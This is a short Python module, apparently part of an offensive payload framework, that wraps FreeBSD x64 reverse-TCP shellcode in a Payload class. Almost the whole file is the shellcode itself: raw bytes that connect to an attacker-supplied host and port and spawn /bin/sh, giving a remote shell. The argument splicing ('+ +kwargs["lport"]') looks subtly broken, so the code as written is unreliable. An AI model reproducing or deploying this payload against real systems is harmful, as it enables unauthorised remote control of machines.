from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Unkown"
    Shellcode.info["name"] = "FreeBSDx64 - reverse_tcp shellcode"

    def __init__(self, **kwargs): 
        Shellcode.info["payload"] = [
            r"\x31\xc0\x83\xc0\x61\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2" 
            r"\x0f\x05\x49\x89\xc4\x48\x89\xc7\x31\xc0\x83\xc0\x62\x48" 
            r"\x31\xf6\x56\x48\xbe\x00\x02"
            + kwargs["host"] +
            +kwargs["lport"] +
            r"\x56" 
            r"\x48\x89\xe6\x6a\x10\x5a\x0f\x05\x4c\x89\xe7\x31\xc0\x83" 
            r"\xc0\x5a\x48\x31\xf6\x0f\x05\x31\xc0\x83\xc0\x5a\x48\xff" 
            r"\xc6\x0f\x05\x48\x31\xc0\x31\xc0\x83\xc0\x3b\xe8\x08\x00" 
            r"\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x48\x8b\x3c\x24" 
            r"\x48\x31\xd2\x52\x57\x48\x89\xe6\x0f\x05"

        ]
